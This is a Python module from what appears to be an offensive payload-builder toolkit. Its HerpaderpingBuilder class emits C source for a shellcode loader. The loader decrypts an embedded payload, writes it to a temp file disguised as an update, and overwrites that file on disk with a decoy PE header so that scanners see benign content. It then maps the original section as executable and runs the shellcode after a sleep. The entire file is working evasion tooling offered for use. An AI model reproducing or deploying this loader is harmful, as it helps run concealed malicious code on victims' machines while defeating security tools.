#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""C source generator for Process Herpaderping-style file/section mapping."""

from __future__ import annotations

from lib.compile.injection_common import InjectionBuilder


class HerpaderpingBuilder(InjectionBuilder):
    def build_source(
        self,
        encoded_payload: str,
        key: bytes,
        iv=None,
        *,
        temp_filename: str = "ks_update.bin",
    ) -> str:
        fname = temp_filename.replace("\\", "\\\\").replace('"', '\\"')
        return f"""
{chr(10).join(self.headers())}

char* enc_payload = "{encoded_payload}";
char* map_filename = "{fname}";

/* Benign decoy written to disk after the section is created (Herpaderping). */
static const unsigned char decoy_pe[] = {{
    0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00,
    0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00,
    0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00
}};

static BOOL herpaderp_execute(PBYTE shellcode, SIZE_T size)
{{
    char path[MAX_PATH];
    HANDLE hFile = INVALID_HANDLE_VALUE;
    HANDLE hSection = NULL;
    PVOID mapped = NULL;
    DWORD written = 0;
    DWORD old = 0;

    if (!GetTempPathA(MAX_PATH, path)) return FALSE;
    if (lstrlenA(path) + lstrlenA(map_filename) + 2 >= MAX_PATH) return FALSE;
    lstrcatA(path, map_filename);

    hFile = CreateFileA(
        path,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    if (!WriteFile(hFile, shellcode, (DWORD)size, &written, NULL) || written != size)
        goto cleanup;

    hSection = CreateFileMappingA(hFile, NULL, PAGE_READWRITE, 0, (DWORD)size, NULL);
    CloseHandle(hFile);
    hFile = INVALID_HANDLE_VALUE;
    if (!hSection) goto cleanup;

    /* Overwrite on-disk contents; mapped view retains original section pages. */
    hFile = CreateFileA(
        path,
        GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    if (hFile != INVALID_HANDLE_VALUE)
    {{
        SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
        WriteFile(hFile, decoy_pe, sizeof(decoy_pe), &written, NULL);
        SetEndOfFile(hFile);
        CloseHandle(hFile);
        hFile = INVALID_HANDLE_VALUE;
    }}

    mapped = MapViewOfFile(hSection, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, size);
    if (!mapped) goto cleanup;

    if (!VirtualProtect(mapped, size, PAGE_EXECUTE_READ, &old))
        goto cleanup;

    {self.sleep_block()}
    ((void(*)())mapped)();

    if (mapped) UnmapViewOfFile(mapped);
    if (hSection) CloseHandle(hSection);
    DeleteFileA(path);
    return TRUE;

cleanup:
    if (mapped) UnmapViewOfFile(mapped);
    if (hSection) CloseHandle(hSection);
    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    DeleteFileA(path);
    return mapped != NULL;
}}

int main(void)
{{
{self.decode_preamble()}
{self.decrypt_block(key, iv)}
    if (!herpaderp_execute(shellcode_buf, payload_size)) return 1;
    VirtualFree(shellcode_buf, 0, MEM_RELEASE);
    free(decoded);
    return 0;
}}
"""
